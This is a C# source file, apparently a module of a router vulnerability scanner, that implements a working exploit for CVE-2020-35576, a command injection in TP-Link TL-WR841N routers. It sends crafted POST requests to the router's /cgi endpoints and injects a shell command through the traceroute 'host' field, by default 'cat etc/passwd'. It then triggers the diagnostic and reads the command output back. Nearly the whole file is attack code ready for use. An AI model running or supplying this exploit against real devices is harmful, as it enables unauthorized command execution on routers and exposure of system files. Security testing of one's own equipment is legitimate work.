namespace RouterScanner.Services.VulHub;

/// <summary>
/// TP-Link TL-WR841N - Command Injection
/// <br/><see cref="https://www.exploit-db.com/exploits/50058"/>
/// </summary>
public sealed class CVE_2020_35576 : RouterVulHubBase<CVE_2020_35576>, IRouterVulHub
{
    public string CVE => "CVE-2020-35576";
    public string VulType => "命令注入";
    public string Production => "TP-Link";
    public List<string> Version => ["TL-WR841N 0.9.1", "TL-WR841N 4.0"];


    public CVE_2020_35576()
    {
        Payload.Cmd = "cat etc/passwd";
    }

    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        var data = $"""
            [TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\r\nmaxHopCount=20\r\ntimeout=50\r\nnumberOfTries=1\r\nhost="{Payload.Cmd}"\r\ndataBlockSize=64\r\nX_TP_ConnName=ewan_ipoe_d\r\ndiagnosticsState=Requested\r\nX_TP_HopSeq=0\r\n
            """;
        var res = await Reqeust("/cgi?2", data, cancellationToken);
        if (!res.Contains("[error]0"))
        {
            return OK(false);
        }

        var data2 = "[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n";
        await Reqeust("/cgi?7", data2, cancellationToken);
        await Task.Delay(800, cancellationToken);

        var data3 = "[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\ndiagnosticsState\r\nX_TP_HopSeq\r\nX_TP_Result\r\n";
        res = await Reqeust("/cgi?1", data3, cancellationToken);
        return OK(message: res);
    }

    private async ValueTask<string> Reqeust(string uri, string data, CancellationToken cancellationToken = default)
    {
        var rawText = $"""
            POST {uri} HTTP/1.1 
            Host: {Host}
            Authorization: {GetBasicAuth()}
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko=/20100101 Firefox/84.0
            Accept: */*
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Content-Type: text/plain
            Content-Length: 197
            Origin: http://{Host}
            Connection: close
            Referer: http://{Host}/mainFrame.htm

            {data}
            """;
        var resp = await Http.SendAsync(rawText, SSL, cancellationToken);
        var res = await resp.Content.ReadAsStringAsync(cancellationToken);
        return res;
    }
}
